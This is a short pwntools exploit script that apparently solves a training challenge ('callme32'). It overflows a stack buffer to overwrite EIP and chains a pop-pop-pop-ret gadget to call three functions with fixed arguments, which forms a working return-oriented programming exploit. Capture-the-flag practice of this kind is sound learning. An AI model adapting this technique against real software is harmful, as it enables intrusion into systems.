from pwn import *

eip = b'A' * 44 # Chars needed to overwrite EIP

args = p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d) # Agrs needed to call each function

gadget = p32(0x080487f9) # pop esi ; pop edi ; pop ebp ; ret

callme1 = p32(0x80484f0) # callme1 function address
callme2 = p32(0x8048550) # callme2 function address
callme3 = p32(0x80484e0) # callme3 function address

### Payload ###
payload = eip + callme1 + gadget + args
payload += callme2 + gadget + args
payload += callme3 + gadget + args


target = process('./callme32')
target.sendline(payload)
out = target.recv()

print(out[136:])
target.interactive()
